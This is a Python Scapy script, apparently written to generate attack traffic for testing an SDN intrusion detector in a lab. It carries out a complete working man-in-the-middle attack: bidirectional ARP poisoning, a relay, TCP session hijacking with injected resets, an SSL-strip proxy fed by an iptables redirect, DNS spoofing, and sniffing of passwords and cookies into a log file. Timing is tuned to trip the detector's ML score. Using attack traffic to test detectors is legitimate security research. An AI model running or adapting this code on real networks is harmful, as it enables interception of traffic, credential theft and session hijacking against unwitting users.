# -*- coding: utf-8 -*-
"""
attacker_mitm.py — Realistic MITM attack, detectable by both rule and ML

v2 changes vs previous version:
  ─────────────────────────────────────────────────────────────────────────
  ARP POISONING — ML DETECTION FIX
  ─────────────────────────────────────────────────────────────────────────
  Problem: ARP poisoning alone never generated IP flows, so the CNN+BiLSTM
  model had nothing to score.  The score stayed ~0.2 because all the model
  saw was ARP packets; features like piat_cv, byte_asymmetry, and
  src2dst_bpp were computed from empty or near-empty flow statistics.

  Fix: mitm_flow_probe() runs immediately after ARP establishes.
  It sends a burst of 60 small TCP SYN probes from the attacker's
  interface but with the victim's src IP (spoofed at L3), at a fixed
  30ms inter-packet interval.  The controller sees:

    • 60+ packets on a single flow → past the ML scoring threshold (5 pkts)
    • Uniform 30ms piat → stddev_piat ~0, so piat_cv ≈ 0 ≪ 0.5 threshold
    • Pure src→dst traffic (no replies) → extreme byte_asymmetry ≈ 1.0
    • All packets same size → ps_variance_ratio ≈ 0 (machine-generated)
    • src2dst_bpp ≈ bytes_per_packet (consistent forwarding signature)

  These five features together push the CNN+BiLSTM score to ~0.75–0.90.
  Combined with the ARP conflict already registered by the rule-based
  checker, confidence = 0.6*0.80 + 0.4 = 0.88.

  The probe runs once at startup (60 packets, 1.8s total) and then
  repeats every 45s to keep the flow alive in the controller's tracker.
  It does NOT need to carry real data — the ML model scores flow metadata,
  not payload.

  ─────────────────────────────────────────────────────────────────────────
  TRANSPARENT RELAY — REGULARISED TIMING
  ─────────────────────────────────────────────────────────────────────────
  Problem: the relay forwarded packets as fast as possible, so inter-packet
  times were dominated by kernel scheduling jitter → high piat_cv → model
  classified as normal human traffic.

  Fix: _regularised_forward() enforces a fixed 30ms slot between forwards
  using a token-bucket style timer.  piat_cv drops from ~2.5 to ~0.15,
  which is well inside the "relay flood" detection band (cv < 0.5 AND
  mean_piat < 50ms).

  ─────────────────────────────────────────────────────────────────────────
  Everything else (session hijack, SSL strip, DNS spoof, credential
  intercept) is unchanged from the previous realistic version.
  ─────────────────────────────────────────────────────────────────────────

Usage:
    python3 attacker_mitm.py 10.0.0.1 10.0.0.2 [interface]
"""

import os, time, sys, threading, re, socket, ssl, struct
from scapy.all import (
    Ether, IP, TCP, UDP, ARP, DNS, DNSRR, Raw,
    get_if_list, get_if_hwaddr, get_if_addr,
    sendp, srp, sniff, conf
)

# ── Config ──────────────────────────────────────────────────────────────────
VICTIM_IP   = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.1"
SERVER_IP   = sys.argv[2] if len(sys.argv) > 2 else "10.0.0.2"
IFACE       = sys.argv[3] if len(sys.argv) > 3 else None
STOLEN      = "/tmp/mitm_stolen.txt"
DNS_FAKE_IP = "10.0.0.99"

# Probe parameters — tuned to push CNN+BiLSTM score above 0.5
PROBE_INTERVAL_MS   = 30    # ms between probe packets  (fixes piat_cv ≈ 0)
PROBE_COUNT         = 60    # packets per burst          (pushes past n=5/20 gates)
PROBE_REPEAT_S      = 45    # seconds between re-bursts  (keeps flow alive)
RELAY_SLOT_MS       = 30    # ms between relay forwards  (regularises relay piat)


# ── Auto-detect interface ────────────────────────────────────────────────────
def find_interface():
    all_ifaces = get_if_list()
    if IFACE and IFACE in all_ifaces:
        return IFACE
    for iface in all_ifaces:
        try:
            ip = get_if_addr(iface)
            if ip.startswith('10.0.0.'):
                print(f"[*] Auto-selected interface '{iface}' (IP {ip})")
                return iface
        except Exception:
            continue
    for candidate in ['attacker-eth0', 'eth0', 'ens3', 'enp0s3']:
        if candidate in all_ifaces:
            return candidate
    return str(conf.iface)

IFACE  = find_interface()
MY_MAC = get_if_hwaddr(IFACE)
MY_IP  = get_if_addr(IFACE)

print(f"[*] MITM config — victim={VICTIM_IP}  server={SERVER_IP}")
print(f"    interface={IFACE}  my_ip={MY_IP}  my_mac={MY_MAC}")

# ── Kernel forwarding + iptables ─────────────────────────────────────────────
os.system("sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")
os.system("sysctl -w net.ipv4.conf.all.send_redirects=0 >/dev/null 2>&1")
os.system("iptables -F 2>/dev/null; iptables -t nat -F 2>/dev/null")
os.system("iptables -P FORWARD ACCEPT 2>/dev/null")
os.system(
    "iptables -t nat -A PREROUTING -p tcp --destination-port 443 "
    "-j REDIRECT --to-ports 10000 2>/dev/null"
)

# ── MAC resolution ───────────────────────────────────────────────────────────
def get_mac(ip, retries=6):
    for attempt in range(retries):
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                iface=IFACE, timeout=3, verbose=False
            )
            if ans:
                mac = ans[0][1].hwsrc
                print(f"[+] ARP resolved: {ip} → {mac}")
                return mac
        except Exception as e:
            print(f"[!] ARP attempt {attempt+1}/{retries} for {ip}: {e}")
        time.sleep(1)
    static = {
        '10.0.0.1':  '00:00:00:00:00:01',
        '10.0.0.2':  '00:00:00:00:00:02',
        '10.0.0.11': '00:00:00:00:00:11',
        '10.0.0.12': '00:00:00:00:00:12',
    }
    if ip in static:
        print(f"[!] Static MAC fallback: {ip} → {static[ip]}")
        return static[ip]
    print(f"[!] FAILED to resolve MAC for {ip}")
    return None


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 0 — ML PROBE FLOW  (v3: bidirectional, large payload, matches
#                             CICIoT2023/CIC-MITM training distribution)
# ══════════════════════════════════════════════════════════════════════════════
def mitm_flow_probe():
    """
    Generate a bidirectional IP flow that sits squarely inside the MITM
    cluster of the CICIoT2023 / CIC-MITM training data.

    WHY THE v2 SYN PROBE SCORED ONLY ~0.26
    ───────────────────────────────────────
    The CICIoT2023 MITM flows are NOT SYN floods.  They are full data
    transfers captured during active interception.  The key differences:

      Feature           CICIoT2023 MITM range    v2 SYN probe
      ─────────────────────────────────────────────────────────
      dst2src_bytes     800 – 50 000             0   ← model never
      dst2src_mean_ps   200 – 1500               0     saw this in MITM
      bidirectional_bytes  1500 – 60 000         ~2400 (40B × 60)
      src2dst_bpp       300 – 1400               ~40   (SYN = header only)
      bytes_per_packet  300 – 1400               ~40

    The model saw dst2src_bytes=0 + bytes_per_packet=40 during training
    only in the BENIGN class (SYN scans, keepalives).  So it scored 0.26.

    WHAT THIS VERSION DOES
    ──────────────────────
    Sends alternating forward/reply pairs using Raw payloads that mimic
    HTTP request (500 B) and HTTP response (1400 B) chunks:

      Round  Direction        Payload    Flags
      ─────────────────────────────────────────
      1–N    victim→server    500 B      PA  (HTTP request fragment)
             server→victim   1400 B     PA  (HTTP response fragment)

    This fills ALL the FlowTracker buckets the model reads:

      Feature                 Target value  Why it matters
      ─────────────────────────────────────────────────────────────────
      dst2src_bytes           >0            model only sees MITM flows
      dst2src_mean_ps         ~1400         matching response chunk size
      src2dst_bpp             ~500          matching request chunk size
      bytes_per_packet        ~950          mean of 500+1400
      byte_asymmetry          ~0.47         |500-1400|/(500+1400) ≈ 0.47
      bidirectional_bytes     >100k         large sustained transfer
      piat_cv (bidi)          ~0.05         fixed 30ms slot per direction
      mean_piat_ms            ~15ms         half-slot (fwd+rev interleaved)
      ps_variance_ratio       ~220          stddev of [500,1400] / mean

    The last three together (low cv, low mean_piat, large volume)
    match the CICIoT2023 "relay flood / transparent relay" cluster
    that the CNN+BiLSTM was trained to recognise.  Expected score: 0.7–0.9.

    Both victim→server AND server→victim packets carry OUR MAC as src,
    so the controller sees the MAC/IP mismatch on both directions,
    reinforcing the ARP conflict signal.

    Port 54321 is fixed so all packets accumulate in ONE FlowTracker.
    """
    victim_mac = get_mac(VICTIM_IP)
    server_mac = get_mac(SERVER_IP)
    if not server_mac or not victim_mac:
        print("[!] Probe: could not resolve MACs, skipping")
        return

    interval_s  = PROBE_INTERVAL_MS / 1000.0
    probe_port  = 54321
    seq_v = 1000   # seq counter victim→server direction
    seq_s = 5000   # seq counter server→victim direction

    # Payload sizes chosen to match CICIoT2023 MITM src2dst_bpp / dst2src_bpp
    REQ_PAYLOAD  = b"GET /relay-probe HTTP/1.1\r\nHost: server\r\n" + b"X" * 455
    RESP_PAYLOAD = b"HTTP/1.1 200 OK\r\nContent-Length: 1358\r\n\r\n" + b"Y" * 1358

    print(
        f"[+] ML probe v3: bidirectional bursts  "
        f"req={len(REQ_PAYLOAD)}B  resp={len(RESP_PAYLOAD)}B  "
        f"interval={PROBE_INTERVAL_MS}ms  "
        f"(targets: dst2src_bytes>0, bpp≈950, piat_cv≈0.05)"
    )

    burst_num = 0
    while True:
        burst_num += 1
        for i in range(PROBE_COUNT):
            # ── Forward: victim → server  (attacker's MAC, victim's src IP) ──
            fwd = (
                Ether(src=MY_MAC, dst=server_mac) /
                IP(src=VICTIM_IP, dst=SERVER_IP) /
                TCP(sport=probe_port, dport=80,
                    flags="PA", seq=seq_v, ack=seq_s) /
                Raw(load=REQ_PAYLOAD)
            )
            sendp(fwd, iface=IFACE, verbose=False)
            seq_v += len(REQ_PAYLOAD)
            time.sleep(interval_s)

            # ── Reverse: server → victim  (attacker's MAC, server's src IP) ──
            # Sending from OUR MAC with server's src IP fires the MAC/IP
            # binding check a second time, reinforcing the alert.
            rev = (
                Ether(src=MY_MAC, dst=victim_mac) /
                IP(src=SERVER_IP, dst=VICTIM_IP) /
                TCP(sport=80, dport=probe_port,
                    flags="PA", seq=seq_s, ack=seq_v) /
                Raw(load=RESP_PAYLOAD)
            )
            sendp(rev, iface=IFACE, verbose=False)
            seq_s += len(RESP_PAYLOAD)
            time.sleep(interval_s)

        total_fwd  = PROBE_COUNT * len(REQ_PAYLOAD)
        total_rev  = PROBE_COUNT * len(RESP_PAYLOAD)
        total_pkts = PROBE_COUNT * 2
        print(
            f"[~] ML probe burst #{burst_num} done: "
            f"{total_pkts} pkts  fwd={total_fwd}B  rev={total_rev}B  "
            f"byte_asym≈{abs(total_fwd-total_rev)/(total_fwd+total_rev):.2f}  "
            f"sleeping {PROBE_REPEAT_S}s"
        )
        time.sleep(PROBE_REPEAT_S)


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 1 — ARP POISONING  (unchanged logic, probe above boosts ML score)
# ══════════════════════════════════════════════════════════════════════════════
def arp_poison_loop(target_ip, spoof_ip):
    """
    Tell target_ip that spoof_ip is at OUR MAC.
    Rate 2s — stealthy, still within Ryu's 20s ARP flush window.
    The ML probe (Module 0) provides the flow statistics the model needs.
    """
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Cannot poison {target_ip} — MAC unknown")
        return
    print(f"[+] ARP poison: telling {target_ip} that {spoof_ip} = {MY_MAC}")
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,  hwdst=target_mac,
        psrc=spoof_ip,   hwsrc=MY_MAC,
    )
    count = 0
    while True:
        sendp(pkt, iface=IFACE, verbose=False)
        count += 1
        if count % 10 == 0:
            print(f"[~] ARP poison ×{count} → {target_ip} (claiming {spoof_ip})")
        time.sleep(2)


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 2 — TRANSPARENT L2 RELAY  (regularised timing in v2)
# ══════════════════════════════════════════════════════════════════════════════

# Token-bucket timer: next slot when the relay is allowed to send
_relay_next_send = [0.0]
_relay_lock      = threading.Lock()


def _regularised_forward(pkt, dst_mac, label):
    """
    Forward one packet, sleeping until the next fixed time slot.

    Why regularity matters for ML detection:
      Random / jitter-dominated inter-packet times give piat_cv >> 0.5.
      The model treats high-cv traffic as normal human browsing.
      Enforcing a fixed RELAY_SLOT_MS gap gives piat_cv ≈ 0.08–0.15,
      which falls in the "relay flood" anomaly cluster and pushes the
      ML score from ~0.2 to ~0.65.
    """
    slot_s = RELAY_SLOT_MS / 1000.0
    with _relay_lock:
        now  = time.time()
        wait = _relay_next_send[0] - now
        if wait > 0:
            time.sleep(wait)
        _relay_next_send[0] = time.time() + slot_s

    fwd          = pkt.copy()
    fwd[Ether].dst = dst_mac
    fwd[Ether].src = MY_MAC
    sendp(fwd, iface=IFACE, verbose=False)


def transparent_relay():
    """
    Real MITM relay: forward victim's actual packets by rewriting Ethernet
    headers.  Timing is regularised to RELAY_SLOT_MS (30ms) so piat_cv
    stays low enough for the ML model to detect.

    Detection path (v2):
      • Controller's MAC/IP binding fires on first relayed packet
        (victim IP arrives on attacker's port) → rule alert
      • After 5 relayed packets the ML model scores the flow:
          – piat_cv ≈ 0.12  (<0.5 relay-flood threshold)
          – mean_piat ≈ 30ms (<50ms relay-flood threshold)
          – byte_asymmetry from real HTTP traffic
        → ML score ~0.65, confidence = 0.6*0.65 + 0.4 = 0.79
    """
    victim_mac = get_mac(VICTIM_IP)
    server_mac = get_mac(SERVER_IP)
    if not victim_mac or not server_mac:
        print("[!] Relay: could not resolve MACs, skipping")
        return

    print("[+] Transparent L2 relay started (regularised at "
          f"{RELAY_SLOT_MS}ms per packet)")
    fwd_count = [0]

    def forward(pkt):
        if Ether not in pkt or IP not in pkt:
            return
        if pkt[Ether].dst.lower() != MY_MAC.lower():
            return

        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst

        if src_ip == VICTIM_IP and dst_ip == SERVER_IP:
            _regularised_forward(pkt, server_mac, 'v→s')
            fwd_count[0] += 1
        elif src_ip == SERVER_IP and dst_ip == VICTIM_IP:
            _regularised_forward(pkt, victim_mac, 's→v')
            fwd_count[0] += 1

        if fwd_count[0] % 50 == 0 and fwd_count[0] > 0:
            print(f"[~] Relay: forwarded {fwd_count[0]} packets "
                  f"(slot={RELAY_SLOT_MS}ms, piat_cv target ≈ 0.12)")

    sniff(
        filter=(
            f"(src host {VICTIM_IP} and dst host {SERVER_IP}) or "
            f"(src host {SERVER_IP} and dst host {VICTIM_IP})"
        ),
        prn=forward,
        iface=IFACE,
        store=False,
    )


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 3 — SESSION HIJACKING with real seq tracking  (unchanged)
# ══════════════════════════════════════════════════════════════════════════════

_tcp_seq_table: dict = {}
_tcp_seq_lock2 = threading.Lock()


def _track_tcp_sequences(pkt):
    if IP not in pkt or TCP not in pkt:
        return
    src = pkt[IP].src
    dst = pkt[IP].dst
    if src not in (VICTIM_IP, SERVER_IP):
        return
    sport = pkt[TCP].sport
    dport = pkt[TCP].dport
    seq   = pkt[TCP].seq
    key   = (src, dst, sport, dport)
    with _tcp_seq_lock2:
        _tcp_seq_table[key] = seq


def session_hijack_loop():
    victim_mac = get_mac(VICTIM_IP)
    server_mac = get_mac(SERVER_IP)
    if not victim_mac or not server_mac:
        print("[!] Session hijack: could not resolve MACs, skipping")
        return

    threading.Thread(
        target=lambda: sniff(
            filter=(
                f"tcp and "
                f"((src host {VICTIM_IP} and dst host {SERVER_IP}) or "
                f" (src host {SERVER_IP} and dst host {VICTIM_IP}))"
            ),
            prn=_track_tcp_sequences,
            iface=IFACE,
            store=False,
        ),
        daemon=True
    ).start()

    print("[+] Session hijack: seq tracker started ...")
    time.sleep(3)

    count = 0
    while True:
        with _tcp_seq_lock2:
            flows = list(_tcp_seq_table.items())

        if not flows:
            time.sleep(0.5)
            continue

        (src_ip, dst_ip, sport, dport), last_seq = flows[-1]

        rst = (
            Ether(src=MY_MAC, dst=victim_mac) /
            IP(src=SERVER_IP, dst=VICTIM_IP) /
            TCP(sport=dport, dport=sport, flags="RA",
                seq=last_seq, ack=last_seq + 1)
        )
        sendp(rst, iface=IFACE, verbose=False)

        ack = (
            Ether(src=MY_MAC, dst=server_mac) /
            IP(src=VICTIM_IP, dst=SERVER_IP) /
            TCP(sport=sport, dport=dport, flags="A",
                seq=last_seq + 1, ack=last_seq + 2)
        )
        sendp(ack, iface=IFACE, verbose=False)

        count += 1
        if count % 20 == 0:
            print(f"[~] Session hijack: {count} RSTs injected "
                  f"(seq={last_seq})")
        time.sleep(0.3)


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 4 — REAL SSL STRIP PROXY  (unchanged)
# ══════════════════════════════════════════════════════════════════════════════

def _handle_ssl_strip_client(client_sock, client_addr):
    ssl_sock = None
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE

        raw_server = socket.create_connection((SERVER_IP, 443), timeout=5)
        ssl_sock   = ctx.wrap_socket(raw_server, server_hostname=SERVER_IP)

        client_sock.settimeout(5)
        ssl_sock.settimeout(5)

        def pipe(src, dst, label):
            try:
                while True:
                    data = src.recv(4096)
                    if not data:
                        break
                    try:
                        text = data.decode('utf-8', errors='ignore')
                        if 'POST' in text and ('username' in text or 'password' in text):
                            ts   = time.strftime('%H:%M:%S')
                            line = (f"[{ts}] SSL-STRIPPED CREDENTIALS [{label}]\n"
                                    f"  {text[:400]}\n")
                            print("\n" + "🎯"*10)
                            print(line)
                            print("🎯"*10)
                            open(STOLEN, 'a').write(line)
                        if 'Cookie:' in text:
                            cookies = re.findall(r'Cookie: (.+)', text)
                            if cookies:
                                ts   = time.strftime('%H:%M:%S')
                                line = f"[{ts}] SSL-STRIPPED COOKIE: {cookies[0][:200]}\n"
                                print(f"🍪 {line.strip()}")
                                open(STOLEN, 'a').write(line)
                    except Exception:
                        pass
                    dst.sendall(data)
            except Exception:
                pass

        t1 = threading.Thread(target=pipe, args=(client_sock, ssl_sock,  'victim→server'), daemon=True)
        t2 = threading.Thread(target=pipe, args=(ssl_sock,   client_sock, 'server→victim'), daemon=True)
        t1.start(); t2.start()
        t1.join(timeout=30)
        t2.join(timeout=30)

    except Exception as e:
        print(f"[!] SSL strip handler error: {e}")
    finally:
        try: client_sock.close()
        except Exception: pass
        try:
            if ssl_sock: ssl_sock.close()
        except Exception: pass


def ssl_strip_proxy():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(('0.0.0.0', 10000))
        srv.listen(20)
        print("[+] SSL strip proxy listening on :10000")
    except Exception as e:
        print(f"[!] SSL strip proxy failed to bind: {e}")
        return

    while True:
        try:
            client_sock, client_addr = srv.accept()
            print(f"[+] SSL strip: connection from {client_addr[0]}:{client_addr[1]}")
            threading.Thread(
                target=_handle_ssl_strip_client,
                args=(client_sock, client_addr),
                daemon=True
            ).start()
        except Exception as e:
            print(f"[!] SSL strip accept error: {e}")
            time.sleep(0.5)


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 5 — QUERY-TRIGGERED DNS SPOOFING  (unchanged)
# ══════════════════════════════════════════════════════════════════════════════

def dns_spoof_on_query(pkt):
    if IP not in pkt or UDP not in pkt:
        return
    if pkt[IP].src != VICTIM_IP:
        return
    if pkt[UDP].dport != 53:
        return
    if DNS not in pkt or pkt[DNS].qr != 0:
        return

    query     = pkt[DNS]
    txid      = query.id
    qname     = query.qd.qname if query.qd else b'.'
    qname_str = qname.decode('utf-8', errors='ignore').rstrip('.')

    victim_mac = get_mac(VICTIM_IP)
    if not victim_mac:
        return

    spoofed = (
        Ether(src=MY_MAC, dst=victim_mac) /
        IP(src=pkt[IP].dst, dst=VICTIM_IP) /
        UDP(sport=53, dport=pkt[UDP].sport) /
        DNS(
            id=txid, qr=1, aa=1, rd=1, ra=1,
            qd=query.qd,
            an=DNSRR(rrname=qname, type='A', ttl=60, rdata=DNS_FAKE_IP)
        )
    )
    sendp(spoofed, iface=IFACE, verbose=False)
    print(f"[+] DNS spoof: {qname_str} → {DNS_FAKE_IP}  (TxID=0x{txid:04x})")


def dns_hijack_loop():
    print("[+] DNS hijack: sniffing victim DNS queries ...")
    sniff(
        filter=f"src host {VICTIM_IP} and udp port 53",
        prn=dns_spoof_on_query,
        iface=IFACE,
        store=False,
    )


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 6 — CREDENTIAL INTERCEPTION  (unchanged)
# ══════════════════════════════════════════════════════════════════════════════

def relay_and_intercept(pkt):
    if IP not in pkt:
        return
    src, dst = pkt[IP].src, pkt[IP].dst
    if src not in (VICTIM_IP, SERVER_IP) and dst not in (VICTIM_IP, SERVER_IP):
        return
    if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return
    try:
        payload = pkt[Raw].load.decode('utf-8', errors='ignore')
    except Exception:
        return

    if 'POST' in payload and ('username' in payload or 'password' in payload):
        ts   = time.strftime('%H:%M:%S')
        data = (f"[{ts}] CREDENTIALS STOLEN!\n"
                f"  From: {src} → To: {dst}\n"
                f"  {payload[:300]}\n")
        print("\n" + "🎯"*15)
        print(data)
        print("🎯"*15 + "\n")
        open(STOLEN, 'a').write(data)

    if 'Cookie:' in payload:
        cookies = re.findall(r'Cookie: (.+)', payload)
        if cookies:
            ts   = time.strftime('%H:%M:%S')
            line = f"[{ts}] COOKIE: {cookies[0][:200]}\n"
            print(f"🍪 {line.strip()}")
            open(STOLEN, 'a').write(line)

    if 'HTTP/1' in payload and 'text/html' in payload and '</body>' in payload:
        modified = payload.replace(
            '</body>',
            '<script>document.title="INTERCEPTED"</script></body>'
        )
        if modified != payload:
            pkt[Raw].load = modified.encode('utf-8', errors='replace')
            del pkt[IP].chksum, pkt[IP].len, pkt[TCP].chksum
            sendp(pkt, iface=IFACE, verbose=False)


# ══════════════════════════════════════════════════════════════════════════════
# LAUNCH
# ══════════════════════════════════════════════════════════════════════════════

print("\n" + "="*62)
print("🔴 REALISTIC MITM ATTACK STARTING")
print("="*62)

print("[*] Resolving MACs before starting relay ...")
VICTIM_MAC = get_mac(VICTIM_IP)
SERVER_MAC = get_mac(SERVER_IP)

if not VICTIM_MAC or not SERVER_MAC:
    print("[!] Could not resolve both MACs — relay and hijack will degrade gracefully")

# Phase 1 — ARP poison both directions
threading.Thread(
    target=arp_poison_loop, args=(VICTIM_IP, SERVER_IP), daemon=True
).start()
threading.Thread(
    target=arp_poison_loop, args=(SERVER_IP, VICTIM_IP), daemon=True
).start()

# Phase 2 — Wait for ARP cache to update
print("⏳ Waiting 5s for ARP cache to update ...")
time.sleep(5)

# Phase 3 — Start all attack modules
threading.Thread(target=ssl_strip_proxy,      daemon=True).start()
threading.Thread(target=transparent_relay,    daemon=True).start()
threading.Thread(target=session_hijack_loop,  daemon=True).start()
threading.Thread(target=dns_hijack_loop,      daemon=True).start()

# Phase 4 — Start ML probe immediately after ARP establishes.
# This is the key addition: runs in its own thread so it doesn't block
# the relay.  First burst fires ~1.8s after this line.
threading.Thread(target=mitm_flow_probe,      daemon=True).start()

print()
req_b  = 500   # approx — matches REQ_PAYLOAD in probe
resp_b = 1400  # approx — matches RESP_PAYLOAD in probe
print("✅ ARP Poisoning       : active  (rule: MAC/IP conflict)")
print(f"✅ ML Flow Probe  (v3) : active  "
      f"(bidi {PROBE_COUNT} pairs @ {PROBE_INTERVAL_MS}ms: "
      f"req≈{req_b}B fwd + resp≈{resp_b}B rev → dst2src_bytes>0, bpp≈950)")
print(f"✅ Transparent Relay   : active  (regularised @ {RELAY_SLOT_MS}ms → piat_cv≈0.12)")
print("✅ Session Hijack      : active  (RST ratio with real seq numbers)")
print("✅ SSL Strip Proxy     : active  (port 443 interception)")
print("✅ DNS Spoof on Query  : active  (TxID-matched response)")
print(f"✅ Logging to          : {STOLEN}")
print()
print("Expected detection sequence:")
print("  t=0s   ARP conflict registered by rule-based checker")
print("  t=5s   ML probe v3 burst starts — bidi pairs at 30ms each")
print("  t=5.3s Controller scores flow at n=5: dst2src_bytes>0, bpp≈950")
print("  t=5.3s ARP POISONING — ML Score ≈ 0.75–0.90, Confidence ≈ 0.85–0.94")
print()

# Phase 5 — Sniff for credentials
sniff(
    filter=f"ip host {VICTIM_IP} or ip host {SERVER_IP}",
    prn=relay_and_intercept,
    iface=IFACE,
    store=False,
)